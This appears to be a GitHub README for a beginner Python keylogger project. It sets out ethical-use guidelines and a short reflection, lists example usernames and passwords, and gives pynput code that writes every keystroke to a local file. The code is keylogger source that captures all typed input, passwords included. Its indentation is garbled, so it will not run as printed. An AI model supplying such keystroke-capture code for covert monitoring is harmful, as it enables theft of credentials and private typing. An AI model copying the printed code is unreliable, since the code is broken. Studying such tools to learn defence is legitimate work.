This is a CyberSecurity Keylogger used to record keystrokes
___________________________________________________________
1 Legal Compliance: Ensure that the use of this keylogger complies with all applicable laws and regulations in your jurisdiction. Unauthorized monitoring of individuals without their consent may violate privacy laws and could result in legal consequences.

2 Responsible Use: Use this keylogger responsibly and ethically. It should only be used for legitimate purposes, such as cybersecurity testing, forensic analysis, or parental monitoring. Avoid using it for malicious activities or invading others' privacy.

3 Informed Consent: Obtain explicit consent from individuals before monitoring their keystrokes. Inform them about the purpose and extent of monitoring and give them the option to opt out if they are uncomfortable with being monitored.

4 Transparency: Be transparent about the presence of the keylogger and its capabilities. Clearly communicate to users if their activities are being monitored and provide them with access to the collected data upon request.

5 Data Security: Take measures to secure the collected data to prevent unauthorized access or disclosure. Encrypt the log files, restrict access to authorized personnel only, and securely delete the data once it is no longer needed.

6 Educational Purposes: Use the keylogger primarily for educational and research purposes to enhance cybersecurity awareness and improve defensive strategies against malicious attacks.

7 Continuous Improvement: Regularly review and update the keylogger code to address security vulnerabilities and improve its effectiveness while adhering to ethical standards.

8 Community Guidelines: Respect the guidelines and policies of the GitHub community. Avoid sharing or promoting malicious software that could harm users or violate community standards.

(Adhere by Ethical guidelines)

{Misuse will be punishable}

Through this project, I discovered how to create a simple keylogger in Python, learning about monitoring keyboard input and managing files. Handling exceptions taught me the necessity of ensuring program stability. The project shed light on ethical considerations in keylogger use, emphasizing responsible data handling. Keyloggers, while discreet, can aid in security testing, forensics, and parental monitoring. However, they must be used ethically to avoid misuse. Overall, this project provided a practical introduction to cybersecurity and software development, stressing ethical behavior online.
![Keylog ex 1](https://github.com/Kad3n13/Keylogger/assets/159424810/ceb53f7a-93e8-472d-9940-b857849246bb)

![keylogger ex 2](https://github.com/Kad3n13/Keylogger/assets/159424810/f9d0d623-b889-406d-ac56-945c0b885fcf)

Usernames and passwords used for (Example)
Usernames:

    ShadowHunter27
    CrimsonRose
    ElectricNinja

Passwords:

    P@ssw0rd123 (Strong)
    Swordfish87 (Medium)
    123456 (Weak)

![example 3](https://github.com/Kad3n13/Keylogger/assets/159424810/eeb98ddc-e564-4406-b911-f6a9a2f161fa)

Code!!!

    from pynput import keyboard

    def keypressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logkey:
                try:
                if hasattr(key, 'char'):  # Check if the key has a 'char' attribute
                char = key.char
                if char == ' ':  # Check if the character is a space
                    logkey.write('\n')  # Write a newline character if it's a space
                    else:
                    logkey.write(char)
                    else:
                    logkey.write(f'[{key}]')  # Write special keys as-is
                    except Exception as e:
                    print("Error getting char:", e)

                    if __name__ == '__main__':
                    listener = keyboard.Listener(on_press=keypressed)
                    listener.start()
                    input()

